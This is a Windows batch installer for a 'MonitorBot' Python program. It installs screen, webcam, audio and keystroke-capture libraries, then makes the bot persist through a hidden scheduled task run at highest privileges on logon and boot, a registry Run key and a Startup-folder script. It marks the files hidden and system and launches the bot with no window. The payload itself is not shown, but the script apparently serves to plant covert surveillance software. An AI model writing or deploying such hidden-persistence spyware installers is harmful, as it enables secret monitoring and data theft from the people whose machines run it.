@echo off
title MonitorBot Instant Startup Installer
mode con: cols=85 lines=30
color 0A

echo.
echo ===================================================
echo    🚀 MONITORBOT INSTANT STARTUP INSTALLER
echo ===================================================
echo.

:: Administrator check
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Administrator privileges required!
    echo.
    echo Please right-click and "Run as Administrator"
    echo.
    pause
    exit /b 1
)

echo [SUCCESS] Running as Administrator
echo.

:: Set variables
set "SOURCE_DIR=%~dp0"
set "INSTALL_DIR=C:\notify"
set "BOT_FILE=monitor_bot.py"
set "VBS_FILE=monitor_bot.vbs"
set "TASK_NAME=MonitorSystemBot"

echo [INFO] Starting installation from: %SOURCE_DIR%
echo.

:: Check Python installation
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH!
    echo.
    echo Please install Python 3.7+ from python.org
    echo And check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

python --version
echo [SUCCESS] Python detected
echo.

:: Create installation directory
echo [INFO] Creating installation directory...
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
    if %errorLevel% neq 0 (
        echo [ERROR] Failed to create directory: %INSTALL_DIR%
        pause
        exit /b 1
    )
    echo [SUCCESS] Directory created: %INSTALL_DIR%
) else (
    echo [INFO] Directory already exists: %INSTALL_DIR%
)

:: Copy ALL files from source to installation directory
echo.
echo [INFO] Copying all files to installation directory...
echo Source: %SOURCE_DIR%
echo Destination: %INSTALL_DIR%
echo.

:: Copy Python file
if exist "%SOURCE_DIR%%BOT_FILE%" (
    copy "%SOURCE_DIR%%BOT_FILE%" "%INSTALL_DIR%\" >nul 2>&1
    if %errorLevel% neq 0 (
        echo [ERROR] Failed to copy %BOT_FILE%
    ) else (
        echo [SUCCESS] %BOT_FILE% copied
    )
) else (
    echo [ERROR] %BOT_FILE% not found in source directory!
    pause
    exit /b 1
)

:: Copy VBS file
if exist "%SOURCE_DIR%%VBS_FILE%" (
    copy "%SOURCE_DIR%%VBS_FILE%" "%INSTALL_DIR%\" >nul 2>&1
    if %errorLevel% neq 0 (
        echo [WARNING] Failed to copy %VBS_FILE%
    ) else (
        echo [SUCCESS] %VBS_FILE% copied
    )
) else (
    echo [WARNING] %VBS_FILE% not found
)

:: Copy other possible files
for %%f in (
    "requirements.txt" 
    "config.json" 
    "settings.ini" 
    "*.yaml" 
    "*.cfg"
    "README.md"
) do (
    if exist "%SOURCE_DIR%%%f" (
        copy "%SOURCE_DIR%%%f" "%INSTALL_DIR%\" >nul 2>&1
        if !errorLevel! equ 0 (
            echo [SUCCESS] %%~nxf copied
        )
    )
)

echo.
echo [SUCCESS] All files copied to %INSTALL_DIR%
echo.

:: Now change to installation directory and continue setup
cd /d "%INSTALL_DIR%"
echo [INFO] Now working from: %CD%
echo.

:: Install Python dependencies
echo [INFO] Installing Python dependencies...
echo Please wait, this may take a few minutes...
echo.

python -m pip install --upgrade pip >nul 2>&1
python -m pip install requests mss opencv-python numpy sounddevice scipy psutil pynput cryptography pillow >nul 2>&1

if %errorLevel% neq 0 (
    echo [WARNING] Some dependencies may have issues
    echo But installation will continue...
) else (
    echo [SUCCESS] All dependencies installed
)
echo.

:: Create instant startup XML (NO DELAY)
echo [INFO] Creating instant startup task...
set "INSTANT_XML=%INSTALL_DIR%\monitor_instant.xml"

(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Description^>Monitor Bot - Instant Startup^</Description^>
echo     ^<Author^>%USERNAME%^</Author^>
echo     ^<URI^>\MonitorSystemBot^</URI^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<LogonTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo       ^<Delay^>PT0S^</Delay^>
echo     ^</LogonTrigger^>
echo     ^<BootTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo       ^<Delay^>PT0S^</Delay^>
echo     ^</BootTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-21-1840048234-1245939497-617013209-1001^</UserId^>
echo       ^<LogonType^>InteractiveToken^</LogonType^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>true^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>false^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo     ^<WakeToRun^>false^</WakeToRun^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Priority^>4^</Priority^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>pythonw.exe^</Command^>
echo       ^<Arguments^>%INSTALL_DIR%\monitor_bot.py^</Arguments^>
echo       ^<WorkingDirectory^>%INSTALL_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "%INSTANT_XML%"

:: Import instant startup task
echo [INFO] Importing instant startup task...
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /tn "%TASK_NAME%" /xml "%INSTANT_XML%" >nul 2>&1

if %errorLevel% neq 0 (
    echo [ERROR] Failed to import task with XML!
    echo Creating instant task manually...
    goto :CREATE_INSTANT_TASK
) else (
    echo [SUCCESS] Instant startup task imported!
    goto :TASK_SUCCESS
)

:CREATE_INSTANT_TASK
echo.
echo [INFO] Creating instant task manually...
schtasks /create /tn "%TASK_NAME%" /tr "pythonw.exe \"%INSTALL_DIR%\monitor_bot.py\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f >nul 2>&1

if %errorLevel% neq 0 (
    echo [ERROR] Manual task creation failed!
    echo Using registry method for instant startup...
    goto :REGISTRY_STARTUP
) else (
    echo [SUCCESS] Instant manual task created!
)

:TASK_SUCCESS
:: Additional registry startup (immediate)
echo.
echo [INFO] Adding immediate registry startup...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "MonitorBotInstant" /t REG_SZ /d "pythonw.exe \"%INSTALL_DIR%\monitor_bot.py\"" /f >nul 2>&1

:: Startup folder method (fastest)
echo [INFO] Adding to startup folder...
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "STARTUP_BAT=%STARTUP_FOLDER%\monitor_start.bat"

(
echo @echo off
echo start /min pythonw.exe "%INSTALL_DIR%\monitor_bot.py"
echo exit
) > "%STARTUP_BAT%"

if %errorLevel% neq 0 (
    echo [WARNING] Startup folder method failed
) else (
    echo [SUCCESS] Startup batch file created
)

goto :ALL_METHODS_DONE

:REGISTRY_STARTUP
echo.
echo [INFO] Using registry startup method...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MonitorBot" /t REG_SZ /d "pythonw.exe \"%INSTALL_DIR%\monitor_bot.py\"" /f >nul 2>&1

if %errorLevel% neq 0 (
    echo [ERROR] All startup methods failed!
) else (
    echo [SUCCESS] Registry startup added
)

:ALL_METHODS_DONE
:: Set hidden attributes
echo.
echo [INFO] Setting system attributes...
attrib +h +s "%INSTALL_DIR%\monitor_bot.py" >nul 2>&1
attrib +h "%INSTALL_DIR%\monitor_bot.vbs" >nul 2>&1
attrib +h "%STARTUP_BAT%" >nul 2>&1 2>nul

:: Start bot immediately
echo [INFO] Starting bot immediately...
start /min pythonw "%INSTALL_DIR%\monitor_bot.py"

echo.
echo ===================================================
echo    ✅ INSTALLATION COMPLETED SUCCESSFULLY!
echo ===================================================
echo.
echo 📁 Source Directory: %SOURCE_DIR%
echo 📁 Install Directory: %INSTALL_DIR%
echo ⚡ Startup Method: INSTANT (No Delay)
echo 🚀 Trigger: Login + Boot (Immediate)
echo.
echo 📊 Files Copied:
echo ✓ monitor_bot.py
echo ✓ monitor_bot.vbs
echo ✓ Other configuration files
echo.
echo 🎯 The bot will now:
echo    - Start IMMEDIATELY after login
echo    - Run in background (no window)
echo    - Auto-start on system boot
echo    - Survive reboots automatically
echo.
echo Press any key to exit...
pause >nul
exit /b 0